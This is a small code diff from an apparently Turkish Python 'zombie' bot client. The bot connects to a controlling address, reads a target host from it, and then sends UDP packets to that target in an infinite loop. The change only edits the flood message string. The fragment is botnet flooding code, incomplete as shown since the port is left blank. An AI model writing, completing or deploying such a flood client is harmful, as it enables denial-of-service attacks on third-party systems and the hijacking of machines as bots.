@@ -8,4 +8,4 @@ soket.connect((baglanilacakip,baglanilacakport))
 host= soket.recv(1024)
 port= '' #port gir
 while True:
- soket.sendto(b"LETS GO ZOMBIES!! ANTITRIX POWER ,RESPECT TO EMROVSKY", (str(host), int(port)))
+ soket.sendto(b"LETS GO ZOMBIES!! ANTITRIX POWER", (str(host), int(port)))
